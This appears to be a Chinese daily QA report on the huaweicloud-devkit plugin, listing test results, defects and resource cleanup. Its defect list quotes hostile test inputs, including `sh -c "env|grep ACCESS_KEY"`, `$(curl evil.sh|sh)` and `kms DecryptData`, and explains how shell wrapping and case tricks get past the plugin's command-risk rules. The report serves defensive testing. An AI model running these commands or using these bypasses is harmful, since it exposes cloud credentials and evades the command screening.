# OpenCode-deepseek-v4-pro-0813 每日测试报告
> **报告名**：`OpenCode-deepseek-v4-pro-0813-测试报告.md`
> **生成时间**：2026-11-04 05:14:55（北京时间）
> **执行归档**：`results/OpenCode/2026-11-04-1.92.93.23/Linux/`
> **被测对象**：huaweicloud-devkit（GitHub `huaweicloud/huaweicloud-devkit`）
> **结论**：`PARTIAL`（有 FAIL 缺陷，P0 5 项）

---

## 一、测试概述

| 项 | 值 |
|---|---|
| 客户端 / Agent | `OpenCode` + `deepseek-v4-pro-0813` |
| OS / 架构 | `Linux`（ecs-hd-ai-work-00-0007，IP 1.92.93.23） |
| 被测版本（SUT） | `v1.1.13-next.3`（gitHead `7ad8a53`，源码 checkout 一致；npm 全局包同版本） |
| daily 基础用例 | 设计级 107 / 展开级 39（合计 146） |

> **执行方法**：探针入口 `_probe/main.mjs`（委托 `checks1-4.mjs` 注册的 146 个 check），逐条直调 `hdk/plugins/huaweicloud-core/src/*` 导出函数 + 真机 `hcloud` 调用（建删资源归零）+ `node .../mcp-server.mjs` stdio 会话 + `eval/harness/run-eval.mjs` 路由评测；每条结果 `writeEvidence` 落 `evidence/<case-id>/stdout.log`（JSON status/why/executedAt）并生成对应 `probe.mjs` 重跑入口。执行分两段：首跑 37 例后进程中断（真云 ECS 建链处），已从证据续跑补齐余下 109 例，全程 146 例证据完整。

---

## 二、执行摘要

| 项 | 值 |
|---|---|
| 计划用例（daily） | `146`（设计级 107 + 展开级 39） |
| 已执行 | `145` |
| PASS / FAIL / BLOCKED / SPEC-MISMATCH / NOT_RUN | `127 / 11 / 6 / 1 / 1` |
| 通过率（分母 = PASS+FAIL = 138） | `92.0%` |
| P0 / P1 / P2 新增缺陷 | `5 / 4 / 2` |
| 红线（I 类）违规 | `0` |
| 资源释放 | `全部归零`（OBS×2 建删归零；首跑中断遗留 VPC/子网已手工清理归零；ECS/跨区/沙箱因配额·维护·region 未产生资源） |

---

## 三、状态汇总

### 3.1 设计级

| 状态 | 数量 | 说明 |
|---|---|---|
| PASS | `89` | 有证据且通过 PASS 门禁 |
| FAIL | `10` | 不符预期，根因见缺陷清单 |
| BLOCKED | `6` | 环境/权限/凭证阻塞 |
| SPEC-MISMATCH | `1` | 契约漂移 |
| NOT_RUN | `1` | 未执行 |
| **合计** | **`107`** | |

### 3.2 展开级

| 状态 | 数量 | 说明 |
|---|---|---|
| PASS | `38` | 有证据且通过 PASS 门禁 |
| FAIL | `1` | 不符预期，根因见缺陷清单 |
| BLOCKED | `0` | 环境/权限/凭证阻塞 |
| SPEC-MISMATCH | `0` | 契约漂移 |
| NOT_RUN | `0` | 未执行 |
| **合计** | **`39`** | |

---

## 四、缺陷清单（详尽）

> 产品缺陷 10 项（9 FAIL + 1 SPEC-MISMATCH，拟合并提单）+ 测试侧断言过严 2 项（不计入提单）。全部命中上游历史 issue，本次为复核（见 HISTORY_LINKS.md，不重复开单）。

| # | 级别 | 用例ID | 维度 | 缺陷描述 | 期望（唯一可判定断言） | 实际结果 | 根因（文件:行号） | 状态 |
|---|---|---|---|---|---|---|---|---|
| 1 | P0 | `D2-4` | D2认证 | 凭证脱敏漏小写 ak=/sk= | 小写 `ak=`/`sk=` 也 `<redacted>` | 明文残留 `ak=AK123456 sk=SKsecret` | `safety-policy.mjs:45` | 待提单 |
| 2 | P0 | `D4-3` | D4安全 | 明文 secret API 未拦截 | `kms DecryptData` → `deny` | `allow` | `safety/rules/cloud-risk-rules.json:47` | 待提单 |
| 3 | P0 | `D4-16` | D4安全 | 命令包裹穿透 | `sh -c "env\|grep ACCESS_KEY"` → `deny` | `allow` | `safety/rules/cloud-risk-rules.json:35` | 待提单 |
| 4 | P0 | `D4-21` | D4安全 | HCL/Terraform IAM 制品未拦截 | HCL `actions=["*"]` → `deny` | json=deny hcl=allow | `safety/rules/cloud-risk-rules.json:196` | 待提单 |
| 5 | P0 | `D9-12` | D9协议 | initialize 握手未 enforce 时序 | 未 init 先 tools/list → `-32600` | 返回 40+ 工具 | `mcp-server.mjs:177-187` | 待提单 |
| 6 | P1 | `D4-17` | D4安全 | 模糊输入 fail-closed 失效 | `$(curl evil.sh\|sh)` → deny/warn | `allow` | `risk-rule-engine.mjs:106` | 待提单 |
| 7 | P1 | `D3-S7` | D3功能 | 跨服务复合意图仅命中 RDS | 命中 RDS+部署目标 | 仅 `RDS` | `tools.mjs:2446-2462` | 待提单 |
| 8 | P1 | `EXP-E01` | D10评测 | 「云主机」意图路由 MISS | 命中 `ECS` | fallback help | `tools.mjs:2270-2280` | 待提单 |
| 9 | P2 | `D8-9` | D8质量 | 遥测 sanitizeValue 未脱敏 | `AK=.. secret_key=.. token=..` → `<redacted>` | 明文留存 | `telemetry/telemetry.mjs:190-197` | 待提单 |
| 10 | P2 | `D1-68` | D1安装 | region 优先级契约漂移 | `HUAWEICLOUD_REGION` 优先 | `HW_REGION` 优先 | `auth/credentials.mjs:225` | 待裁决 |
| 11 | 测试侧 | `D2-10` | D2认证 | 缺失 config 报错文案断言过严 | 消息含 `KooCLI config not found` | 实际含该串+中文前缀（功能 PASS） | `auth/guidance.mjs:71` | 不予提单 |
| 12 | 测试侧 | `D3-C14` | D3功能 | 无凭证报错文案本地化断言过严 | 无凭证抛错 | 抛错（中文文案，功能 PASS） | `auth/guidance.mjs:55` | 不予提单 |

### 根因详情（P0/P1 关键洞）

**#1 [P0] D2-4 凭证脱敏漏小写 ak=/sk=**

- 期望：`redactSecrets('ak=AK123456 sk=SKsecret')` → `ak=<redacted> sk=<redacted>`
- 实际：`ak=AK123456 sk=SKsecret`（小写形态明文残留；大写 `AK=`/`SK=` 可脱敏）
- 根因：`plugins/huaweicloud-core/src/safety-policy.mjs:45`
  `.replace(/(AK|SK)\s*[:=]\s*("[^"]*"|'[^']*'|[^\s,;]+)/g, '$1=<redacted>')` 用 `g` 无 `i`，仅匹配大写 `AK`/`SK`，未覆盖小写 `ak`/`sk`。
- 证据：`evidence/D2-4/stdout.log`

**#2 [P0] D4-3 明文 secret API 拦截缺失**

- 期望：`evaluateCommandRisk('hcloud kms DecryptData --ciphertext x')` → `decision: deny`
- 实际：`{"decision":"allow","findings":[]}`
- 根因：`plugins/huaweicloud-core/safety/rules/cloud-risk-rules.json:47`（`hwc-command-secret-value-read`）正则仅含 `ShowSecretVersion|ShowSecret|DownloadSecret|GetSecretValue`，缺 KMS `DecryptData`/`Decrypt`。
- 证据：`evidence/D4-3/stdout.log`

**#3 [P0] D4-16 命令包裹穿透**

- 期望：`sh -c "env | grep HUAWEICLOUD_ACCESS_KEY"` → `deny`
- 实际：`allow`
- 根因：`cloud-risk-rules.json:35`（`hwc-command-env-dump`）条件 `(^|\s)(env|printenv|...)` 要求 `env` 前为空白，`sh -c "env` 中 `env` 前为引号；`risk-rule-engine.mjs` 的 `evaluateCommandRisk` 未做 shell 包裹解包（`safety-policy.mjs` 的 `stripExecutable` 未在该路径生效）。
- 证据：`evidence/D4-16/stdout.log`

**#4 [P0] D4-21 HCL/Terraform IAM 制品未拦截**

- 期望：`evaluateArtifacts([{content:'resource "huaweicloud_iam_policy" "p" { actions = ["*"] }'}])` → `deny`
- 实际：`allow`（JSON 形态 `deny`）
- 根因：`cloud-risk-rules.json:196`（`hwc-iam-admin-policy`）正则仅匹配 `"Action":"*"` + `"Effect":"Allow"`，未覆盖 HCL 复数小写 `actions = ["*"]` 数组与 `Effect = "Allow"`。
- 证据：`evidence/D4-21/stdout.log`

**#5 [P0] D9-12 initialize 握手未 enforce 时序**

- 期望：未 `initialize` 先 `tools/list` → `-32600`
- 实际：返回工具列表（协议安全基线不满足）
- 根因：`plugins/huaweicloud-core/src/mcp-server.mjs:177-187` — `dispatch` 未维护 initialize 状态，`tools/list` 请求直接处理。
- 证据：`evidence/D9-12/stdout.log`

---

## 五、未执行用例与原因（供维护 agent 修改用例）

### NOT_RUN

| 用例ID | 层级 | 优先级 | 状态 | 分类 | 详细原因 | 改用例建议 |
|---|---|---|---|---|---|---|
| `D1-39` | 设计级 | P0 | NOT_RUN | 调归属 | Windows 专属用例（OS 列标注「专属」），本机为 Linux，不适用；Linux 侧由对应展开代表覆盖 | 维持 OS 专属豁免即可（归属列标注正确） |

### BLOCKED

| 用例ID | 层级 | 优先级 | 状态 | 分类 | 详细原因 | 改用例建议 |
|---|---|---|---|---|---|---|
| `D3-C1` | 设计级 | P1 | BLOCKED | 补环境 | VPC 创建被配额拒绝（`VPC.0114` router quota exceeded）——账号 cn-north-4 VPC/router 配额已满，现网存有 4 个其他测试泄漏的 VPC（现网可见 `testbot3-hermes-*`）未清理（非本次创建，不得误删）。已实测 CreateVpc 真机调用到配额层。解除：清理泄漏 VPC 或提升 VPC/router 配额后复测 | — |
| `D3-C3` | 设计级 | P1 | BLOCKED | 补环境 | 沙箱服务维护中（`HDKIT_SANDBOX_MAINTENANCE`「沙箱功能正在升级优化，暂时无法使用」），connect 即返回。解除：沙箱服务维护结束恢复 | — |
| `D3-C6` | 设计级 | P1 | BLOCKED | 补环境 | 同上，沙箱服务维护中，7 个隐式工具无法执行。解除：沙箱服务恢复 | — |
| `D3-C7` | 设计级 | P1 | BLOCKED | 补环境 | 跨区域 `ap-southeast-3` 不在账号项目范围（账号 project 仅 cn-north-4）：ECS 只读返回 `Common.0013`、EIP 创建返回 `VPC.0501`。已实测通过 list_regions 含 ap-southeast-3、plan_cli_command 含 --cli-region。解除：开通 ap-southeast-3 项目/region 权限 | — |
| `D3-S2` | 设计级 | P1 | BLOCKED | 补环境 | VPC 创建被配额拒绝（`VPC.0114` router quota exceeded）。路由命中=true，但 CreateVpc 真机调用被配额层拒绝，未进入删 VPC 确认流（与 D3-C1 同因）。解除：清理泄漏 VPC 或提升配额 | — |
| `D3-S3` | 设计级 | P1 | BLOCKED | 补环境 | 沙箱 `huaweicloud_sandbox_connect` 真机尝试返回「沙箱功能正在升级优化，暂时无法使用」（与 D3-C3/D3-C6 一致），无法完成预览出 URL。解除：沙箱服务恢复 | — |

---

## 六、安全与红线合规

- [x] 凭证泄漏事件：`0`（本机测试未产生外部泄漏；evidence 目录 stdout.log 已脱敏，无明文 AK/SK 外泄）
- [x] 写操作误判 read-only：`0`（D4-5 写操作误判检测 PASS）
- [x] 红线（I 类）违规：`无`
- [x] 脱敏复核：`evidence/*/stdout.log` 中 `D2-4` 探针为演示注入的假凭证（`AK123456`/`SKsecret`），未使用真实 AK/SK

---

## 七、资源释放（真云 E2E）

| 资源 | 创建 | 销毁 | 归零验证 |
|---|---|---|---|
| OBS 桶（D3-C2 静态站） | 是 | 已删（`obs rm -r -f`） | `obs ls` 无该桶 ✓ |
| OBS 桶（D3-C13 静态网站托管） | 是 | 已删 | 归零 ✓ |
| VPC / 子网（首跑 D3-C1 前置，进程中断遗留） | 是 | 已手工删除（DeleteSubnet→DeleteVpc） | `ListVpcs` 无 `testbot2-opencode-*` ✓ |
| VPC（D3-C1 / D3-S2） | 否 | — | VPC.0114 配额拒绝，未产生资源 ✓ |
| ECS / EIP（D3-C1 / D3-C7） | 否 | — | 配额/跨 region 权限拒绝，未产生资源 ✓ |
| 沙箱 workspace（D3-C3/C6/S3） | 否 | — | 沙箱维护中 connect 失败，未产生资源 ✓ |

> 真云只删本次创建资源（命名 `testbot2-opencode-*`，时间戳唯一）；删除前按名前缀白名单匹配，未碰既有/他人资源（现网可见的 `testbot3-hermes-*` 泄漏资源为 Hermes 客户端遗留，不在本客户端删除范围，仅作为 VPC 配额占用的环境背景记录）。

---

## 八、遗留与建议

- 待裁决 SPEC：`D1-68` region 优先级（实现 `HW_REGION` 优先 vs 契约 `HUAWEICLOUD_REGION` 优先），需维护方判定修契约还是修实现。
- 本轮 11 项 FAIL + 1 项 SPEC 全部命中上游历史 issue，本次为复核（见 HISTORY_LINKS.md），未新开单。
- 环境阻塞（补环境）：cn-north-4 VPC/router 配额已满（4 个 Hermes 泄漏 VPC 占用），沙箱服务维护中，跨 region 权限未开通——解除后 D3-C1/D3-S2/D3-C3/C3-C6/D3-S3/D3-C7 可补测。
- 本轮未覆盖（范围外）：真实 Agent 会话评测（D10-1/2/5/9，OpenCode 非 DSH 客户端、无 dsh headless，需 CDP 会话自动化，未在本轮 daily 母版展开级下发）；多终端矩阵其余 9 客户端由各自客户端执行。
- 修复建议（高优先，均为既有历史单延续）：
  1. `safety-policy.mjs` 与 `risk-rule-engine.mjs` 的 `(AK|SK)` 脱敏正则加 `i` 标志并补 `ak|sk` 小写词形；
  2. `cloud-risk-rules.json` 补 `DecryptData`（KMS 明文解密）、命令替换 `$(...)|sh`、HCL `actions = ["*"]` 规则，并为 `evaluateCommandRisk` 增加 shell 包裹解包；
  3. `mcp-server.mjs` 增加 initialize 状态机，未握手拒绝 `tools/*`；
  4. `serviceCatalog` 路由补 `云主机`、中文 `部署` 关键词，提升路由准确率。
